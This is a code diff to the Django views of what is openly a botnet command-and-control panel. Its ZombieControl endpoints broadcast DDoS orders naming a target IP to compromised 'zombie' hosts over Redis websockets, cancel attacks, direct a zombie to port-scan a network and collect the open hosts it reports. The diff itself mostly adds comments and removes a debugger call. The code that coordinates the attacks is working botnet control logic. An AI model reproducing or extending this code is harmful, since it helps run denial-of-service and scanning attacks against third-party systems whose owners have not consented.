@@ -56,7 +56,7 @@ class IndexPage(View,TemplateResponseMixin,ContextMixin):
             context['zombies'] = Zombie.objects.all()
             return context
         def get(self,request):
-
+            #create attacker sesssion and model object if doesn't exist
             if not request.session.exists(request.session.session_key):
                     request.session.create()
                     Attacker.objects.create(sesskey=request.session.session_key)
@@ -82,20 +82,20 @@ class ZombieControl(viewsets.ModelViewSet):
         target = request.data['targetip']
 
         redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
-
+        # tell over Websocket zombies to attack target
         respData = {'attacktype':'ddos','attackInfo':{'targetip':target}}
         redis_publisher.publish_message(RedisMessage(simplejson.dumps(respData)))
         return Response({'ack':'ddos'})
 
     @list_route(methods=['post'])
     def Cancel(self,request,pk=None):
-
+        #cancel attack over broadcast
         if 'zombie'not in request.data:
             redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
 
             respData = {'stopattack':'true'}
             redis_publisher.publish_message(RedisMessage(simplejson.dumps(respData)))
-
+            #cancel for one zombie(maybe not needed)
         else:
 
             zom = Zombie.objects.get(host=request.data['zombie'])
@@ -106,11 +106,12 @@ class ZombieControl(viewsets.ModelViewSet):
 
 
         return Response({'ack':'canceled'})
+    #port scan
     @list_route(methods=['post'])
     def PORTSCAN(self,request,pk=None):
-        target = request.data['targetnet']+":2000"
-        #print(Zombie.objects.all()[0].host)
-        pdb.set_trace()
+        target = request.data['targetnet']
+
+        #tell zombie to scan network
         try:
             redis_publisher = RedisPublisher(facility='solo', sessions=[Zombie.objects.get(host=target).sesskey])
             redis_publisher.publish_message(RedisMessage(simplejson.dumps({'attacktype':'portscan','attackInfo':{}})))
@@ -118,6 +119,7 @@ class ZombieControl(viewsets.ModelViewSet):
             return Response({'failed':'failed'})
 
         return Response({'ack':'portscan'})
+        #zombie will call this to tell attacker which hosts are open
     @list_route(methods=['get'])
     def responds(self,request,pk=None):
 
